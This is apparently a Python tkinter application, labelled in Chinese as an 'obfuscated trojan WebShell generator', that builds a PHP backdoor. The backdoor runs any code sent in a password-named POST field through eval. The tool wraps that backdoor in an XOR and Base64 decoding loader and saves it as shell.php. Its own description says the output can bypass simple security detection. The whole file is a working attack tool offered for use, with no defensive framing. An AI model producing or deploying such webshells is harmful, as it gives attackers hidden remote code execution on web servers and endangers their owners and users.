import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import base64
from datetime import datetime

class WebShellGenerator:
    def __init__(self, root):
        self.root = root
        self.root.title("混淆木马WebShell生成器")
        self.root.geometry("900x700")
        self.root.configure(bg="#f0f4f8")
        
        # 设置应用图标
        try:
            self.root.iconbitmap("webshell_icon.ico")
        except:
            pass
        
        # 设置主题
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # 配置颜色主题（使用专业、明亮的配色）
        self.bg_color = "#f0f4f8"
        self.panel_bg = "#ffffff"
        self.text_bg = "#ffffff"
        self.text_fg = "#333333"
        self.accent_color = "#2c6fbb"
        self.success_color = "#28a745"
        self.warning_color = "#ffc107"
        self.error_color = "#dc3545"
        self.button_color = "#4a7dff"
        
        # 样式配置
        self.style.configure('TFrame', background=self.bg_color)
        self.style.configure('TLabel', background=self.bg_color, foreground="#444444", font=("Segoe UI", 10))
        self.style.configure('TButton', background=self.button_color, foreground="white", 
                            font=("Segoe UI", 10, "bold"), borderwidth=0, relief="flat")
        self.style.map('TButton', 
                      background=[('active', '#3a6de8')],
                      foreground=[('active', 'white')])
        self.style.configure('TEntry', fieldbackground='#ffffff', foreground="#333333", 
                            insertbackground="#333333", bordercolor="#ced4da", 
                            padding=5, font=("Segoe UI", 10))
        self.style.configure('TCombobox', fieldbackground='#ffffff', foreground="#333333")
        self.style.configure('TCheckbutton', background=self.bg_color, foreground="#444444")
        self.style.configure('TLabelframe', background=self.panel_bg, foreground=self.accent_color,
                            font=("Segoe UI", 10, "bold"), borderwidth=1, relief="solid")
        self.style.configure('TLabelframe.Label', background=self.panel_bg, foreground=self.accent_color)
        
        # 创建主框架
        self.main_frame = ttk.Frame(root, padding=20)
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        # 标题区域
        title_frame = ttk.Frame(self.main_frame, style='TFrame')
        title_frame.pack(fill=tk.X, pady=(0, 15))
        
        # 标题
        title = ttk.Label(title_frame, text="混淆木马WebShell生成器", 
                         font=("Segoe UI", 18, "bold"), foreground=self.accent_color)
        title.pack(side=tk.LEFT)
        
        # 版本标签
        version = ttk.Label(title_frame, text="v1.2", foreground="#6c757d", font=("Segoe UI", 10))
        version.pack(side=tk.RIGHT, padx=10)
        
        # 说明文本
        desc_frame = ttk.Frame(self.main_frame)
        desc_frame.pack(fill=tk.X, pady=(0, 20))
        desc = ttk.Label(desc_frame, 
                        text="此工具生成混淆处理的PHP WebShell，可绕过简单的安全检测。生成的WebShell使用双重混淆（XOR + Base64编码）",
                        wraplength=800, justify="center", font=("Segoe UI", 10), foreground="#555555")
        desc.pack(fill=tk.X, pady=5)
        
        # 创建设置面板
        self.create_settings_panel()
        
        # 创建预览区域
        self.create_preview_panel()
        
        # 创建状态栏
        self.status_var = tk.StringVar(value="就绪 - 输入密码和密钥生成WebShell")
        status_bar = ttk.Frame(self.root, relief=tk.SUNKEN, style='TFrame')
        status_bar.pack(side=tk.BOTTOM, fill=tk.X, padx=0, pady=0)
        
        # 状态标签
        status_label = ttk.Label(status_bar, textvariable=self.status_var, anchor=tk.W, font=("Segoe UI", 9), foreground="#555555")
        status_label.pack(side=tk.LEFT, padx=10)
        
        # 时间标签
        self.time_var = tk.StringVar()
        time_label = ttk.Label(status_bar, textvariable=self.time_var, anchor=tk.E, font=("Segoe UI", 9), foreground="#555555")
        time_label.pack(side=tk.RIGHT, padx=10)
        self.update_time()
        
        # 初始化预览
        self.update_preview()
    
    def update_time(self):
        """更新时间显示"""
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.time_var.set(now)
        self.root.after(1000, self.update_time)
    
    def create_settings_panel(self):
        settings_frame = ttk.LabelFrame(self.main_frame, text="生成设置", padding=15)
        settings_frame.pack(fill=tk.X, pady=(0, 15), padx=0)
        
        # 配置项框架
        config_frame = ttk.Frame(settings_frame)
        config_frame.pack(fill=tk.X, pady=5)
        
        # 密码设置
        password_frame = ttk.Frame(config_frame)
        password_frame.pack(fill=tk.X, pady=10)
        ttk.Label(password_frame, text="连接密码:", width=12, anchor=tk.E, 
                 font=("Segoe UI", 10)).pack(side=tk.LEFT, padx=(0, 10))
        self.password_var = tk.StringVar(value="z0")
        password_entry = ttk.Entry(password_frame, textvariable=self.password_var, width=30)
        password_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        password_entry.bind("<KeyRelease>", lambda e: self.update_preview())
        
        # 密钥设置
        key_frame = ttk.Frame(config_frame)
        key_frame.pack(fill=tk.X, pady=10)
        ttk.Label(key_frame, text="混淆密钥:", width=12, anchor=tk.E, 
                 font=("Segoe UI", 10)).pack(side=tk.LEFT, padx=(0, 10))
        self.key_var = tk.StringVar(value="MYKEY123")
        key_entry = ttk.Entry(key_frame, textvariable=self.key_var, width=30)
        key_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        key_entry.bind("<KeyRelease>", lambda e: self.update_preview())
        
        # 文件名设置
        filename_frame = ttk.Frame(config_frame)
        filename_frame.pack(fill=tk.X, pady=10)
        ttk.Label(filename_frame, text="输出文件名:", width=12, anchor=tk.E, 
                 font=("Segoe UI", 10)).pack(side=tk.LEFT, padx=(0, 10))
        self.filename_var = tk.StringVar(value="shell.php")
        filename_entry = ttk.Entry(filename_frame, textvariable=self.filename_var, width=30)
        filename_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # 按钮区域
        button_frame = ttk.Frame(settings_frame)
        button_frame.pack(fill=tk.X, pady=15)
        
        # 按钮样式
        self.style.configure('Primary.TButton', background=self.button_color, foreground="white")
        self.style.configure('Success.TButton', background=self.success_color, foreground="white")
        self.style.configure('Warning.TButton', background=self.warning_color, foreground="#333333")
        self.style.configure('Danger.TButton', background=self.error_color, foreground="white")
        
        gen_btn = ttk.Button(button_frame, text="生成WebShell", 
                            command=self.generate_webshell, style='Primary.TButton')
        gen_btn.pack(side=tk.LEFT, padx=5, ipadx=15, ipady=5)
        
        save_btn = ttk.Button(button_frame, text="保存到文件", 
                             command=self.save_to_file, style='Success.TButton')
        save_btn.pack(side=tk.LEFT, padx=5, ipadx=15, ipady=5)
        
        copy_btn = ttk.Button(button_frame, text="复制到剪贴板", 
                             command=self.copy_to_clipboard, style='Warning.TButton')
        copy_btn.pack(side=tk.LEFT, padx=5, ipadx=15, ipady=5)
        
        clear_btn = ttk.Button(button_frame, text="清除预览", 
                              command=self.clear_preview, style='Danger.TButton')
        clear_btn.pack(side=tk.RIGHT, padx=5, ipadx=15, ipady=5)
    
    def create_preview_panel(self):
        preview_frame = ttk.LabelFrame(self.main_frame, text="WebShell预览", padding=10)
        preview_frame.pack(fill=tk.BOTH, expand=True, padx=0)
        
        # 工具栏
        toolbar = ttk.Frame(preview_frame)
        toolbar.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(toolbar, text="语法高亮:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 5))
        
        # 高亮选项
        self.highlight_var = tk.BooleanVar(value=True)
        highlight_btn = ttk.Checkbutton(toolbar, text="启用", 
                                      variable=self.highlight_var,
                                      command=self.toggle_highlight)
        highlight_btn.pack(side=tk.LEFT, padx=5)
        
        # 搜索框
        search_frame = ttk.Frame(toolbar)
        search_frame.pack(side=tk.RIGHT)
        
        ttk.Label(search_frame, text="搜索:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 5))
        self.search_var = tk.StringVar()
        search_entry = ttk.Entry(search_frame, textvariable=self.search_var, width=20)
        search_entry.pack(side=tk.LEFT)
        search_entry.bind("<KeyRelease>", self.search_text)
        
        # 预览文本区域
        text_frame = ttk.Frame(preview_frame)
        text_frame.pack(fill=tk.BOTH, expand=True)
        
        self.preview_text = scrolledtext.ScrolledText(
            text_frame, 
            bg=self.text_bg, 
            fg=self.text_fg, 
            insertbackground=self.text_fg,
            font=("Consolas", 10),
            wrap=tk.NONE,
            padx=10,
            pady=10,
            highlightthickness=1,
            highlightbackground="#ced4da",
            highlightcolor="#4a7dff"
        )
        self.preview_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # 添加行号
        self.line_numbers = tk.Text(text_frame, width=4, bg="#f8f9fa", fg="#6c757d", 
                                   font=("Consolas", 10), padx=5, pady=10,
                                   state=tk.DISABLED, takefocus=0, bd=0,
                                   highlightthickness=1, highlightbackground="#ced4da")
        self.line_numbers.pack(side=tk.LEFT, fill=tk.Y)
        
        # 禁止编辑
        self.preview_text.bind("<Key>", lambda e: "break")
        
        # 绑定滚动事件
        self.preview_text.bind("<MouseWheel>", self.sync_scroll)
        self.preview_text.bind("<Button-4>", self.sync_scroll)
        self.preview_text.bind("<Button-5>", self.sync_scroll)
    
    def sync_scroll(self, event):
        """同步滚动条位置"""
        self.line_numbers.yview_moveto(self.preview_text.yview()[0])
        return "break"
    
    def toggle_highlight(self):
        """切换语法高亮"""
        if self.highlight_var.get():
            self.highlight_syntax()
        else:
            # 清除所有高亮
            for tag in self.preview_text.tag_names():
                self.preview_text.tag_remove(tag, "1.0", tk.END)
    
    def update_line_numbers(self):
        """更新行号显示"""
        # 获取当前行数
        lines = self.preview_text.get("1.0", tk.END).split('\n')
        num_lines = len(lines) - 1  # 减去最后一行空行
        
        # 配置行号文本
        self.line_numbers.config(state=tk.NORMAL)
        self.line_numbers.delete("1.0", tk.END)
        
        # 添加行号
        for i in range(1, num_lines + 1):
            self.line_numbers.insert(tk.END, f"{i}\n")
        
        self.line_numbers.config(state=tk.DISABLED)
    
    def xor_with_key(self, data, key):
        """使用密钥对数据进行异或加密"""
        data = data.encode('utf-8')
        key = key.encode('utf-8')
        key_length = len(key)
        return bytes([data[i] ^ key[i % key_length] for i in range(len(data))])
    
    def generate_webshell(self):
        """生成WebShell代码"""
        password = self.password_var.get()
        key = self.key_var.get()
        
        if not password:
            messagebox.showerror("错误", "密码不能为空", parent=self.root)
            return ""
        
        if not key:
            messagebox.showerror("错误", "密钥不能为空", parent=self.root)
            return ""
        
        php_code = f"""
if (isset($_POST['{password}'])) {{
    @eval($_POST['{password}']);
}}
"""
        return php_code
    
    def update_preview(self):
        """更新预览区域"""
        self.status_var.set("正在生成WebShell...")
        self.root.update_idletasks()  # 强制刷新UI显示状态
    
        try:
            password = self.password_var.get()
            key = self.key_var.get()
        
            if not password or not key:
                self.preview_text.delete(1.0, tk.END)
                self.preview_text.insert(tk.END, "请输入密码和密钥以预览WebShell")
                self.update_line_numbers()
                self.status_var.set("错误：密码或密钥不能为空")
                return
        
            # 生成原始代码
            original_code = self.generate_webshell()
        
            # 进行混淆处理
            obfuscated = self.xor_with_key(original_code, key)
            base64_encoded = base64.b64encode(obfuscated).decode('utf-8')
        
            # 生成最终PHP代码
            final_php = f"""<?php
function xor_deobf($str, $key) {{
    $out = '';
    for($i = 0; $i < strlen($str); ++$i) {{
       $out .= chr(ord($str[$i]) ^ ord($key[$i % strlen($key)]));
    }}
    return $out;
}}
$key = "{key}";
$obfuscated = "{base64_encoded}";
$original_code = xor_deobf(base64_decode($obfuscated), $key);
eval($original_code);
?>"""
        
            # 更新预览区域
            self.preview_text.delete(1.0, tk.END)
            self.preview_text.insert(tk.END, final_php)
        
            # 更新行号
            self.update_line_numbers()
        
            # 应用语法高亮
            if self.highlight_var.get():
                self.highlight_syntax()
        
            # 更新状态
            self.status_var.set(f"WebShell生成成功 - 代码长度: {len(final_php)} 字符")
        except Exception as e:
            self.status_var.set(f"生成失败: {str(e)}")
        
    def highlight_syntax(self):
        """应用语法高亮"""
        # 定义高亮样式
        self.preview_text.tag_configure("php_tag", foreground="#d6336c", font=("Consolas", 10, "bold"))
        self.preview_text.tag_configure("string", foreground="#20c997")
        self.preview_text.tag_configure("keyword", foreground="#6610f2", font=("Consolas", 10, "bold"))
        self.preview_text.tag_configure("function", foreground="#0d6efd")
        self.preview_text.tag_configure("variable", foreground="#fd7e14")
        self.preview_text.tag_configure("comment", foreground="#6c757d", font=("Consolas", 9))
        
        # 清除所有标签
        for tag in self.preview_text.tag_names():
            self.preview_text.tag_remove(tag, "1.0", tk.END)
        
        # 高亮PHP标签
        self.highlight_pattern(r"<\?php|\?>", "php_tag")
        
        # 高亮字符串
        self.highlight_pattern(r"\".*?\"", "string")
        self.highlight_pattern(r"'.*?'", "string")
        
        # 高亮关键字
        keywords = ["function", "for", "return", "if", "isset", "eval", "strlen", "chr", "ord"]
        for word in keywords:
            self.highlight_pattern(fr"\b{word}\b", "keyword")
        
        # 高亮函数
        self.highlight_pattern(r"\b\w+\(\)", "function")
        
        # 高亮变量
        self.highlight_pattern(r"\$\w+", "variable")
    
    def highlight_pattern(self, pattern, tag):
        """高亮匹配特定模式的内容"""
        start = "1.0"
        while True:
            start = self.preview_text.search(pattern, start, stopindex=tk.END, regexp=True)
            if not start:
                break
            end = self.preview_text.index(f"{start}+{len(self.preview_text.get(start, f'{start} lineend'))}c")
            self.preview_text.tag_add(tag, start, end)
            start = end
    
    def search_text(self, event):
        """搜索文本"""
        search_term = self.search_var.get()
        if not search_term:
            return
        
        # 清除之前的高亮
        self.preview_text.tag_remove("search", "1.0", tk.END)
        
        # 配置搜索高亮
        self.preview_text.tag_configure("search", background="#ffc107", foreground="#333333")
        
        # 搜索文本
        start = "1.0"
        count = 0
        while True:
            start = self.preview_text.search(search_term, start, stopindex=tk.END, nocase=1)
            if not start:
                break
            end = f"{start}+{len(search_term)}c"
            self.preview_text.tag_add("search", start, end)
            count += 1
            start = end
        
        if count > 0:
            self.status_var.set(f"找到 {count} 个匹配项")
        else:
            self.status_var.set(f"未找到匹配项")
    
    def save_to_file(self):
        """保存到文件"""
        filename = self.filename_var.get()
        if not filename:
            messagebox.showerror("错误", "请输入文件名", parent=self.root)
            return
        
        # 添加默认扩展名
        if not filename.lower().endswith('.php'):
            filename += '.php'
        
        # 获取保存路径
        save_path = filedialog.asksaveasfilename(
            initialfile=filename,
            defaultextension=".php",
            filetypes=[("PHP Files", "*.php"), ("All Files", "*.*")]
        )
        
        if not save_path:
            return
        
        content = self.preview_text.get(1.0, tk.END)
        if not content.strip():
            messagebox.showerror("错误", "没有内容可保存", parent=self.root)
            return
        
        try:
            with open(save_path, 'w', encoding='utf-8') as f:
                f.write(content)
            
            self.status_var.set(f"文件已保存: {save_path}")
            messagebox.showinfo("成功", f"WebShell已成功保存到:\n{save_path}", parent=self.root)
        except Exception as e:
            self.status_var.set(f"保存失败: {str(e)}")
            messagebox.showerror("错误", f"保存文件时出错:\n{str(e)}", parent=self.root)
    
    def copy_to_clipboard(self):
        """复制到剪贴板"""
        content = self.preview_text.get(1.0, tk.END)
        if not content.strip():
            messagebox.showerror("错误", "没有内容可复制", parent=self.root)
            return
        
        self.root.clipboard_clear()
        self.root.clipboard_append(content)
        self.status_var.set("代码已复制到剪贴板")
        messagebox.showinfo("成功", "WebShell代码已复制到剪贴板", parent=self.root)
    
    def clear_preview(self):
        """清除预览"""
        self.preview_text.delete(1.0, tk.END)
        self.update_line_numbers()
        self.status_var.set("预览已清除")

if __name__ == "__main__":
    root = tk.Tk()
    app = WebShellGenerator(root)
    root.mainloop()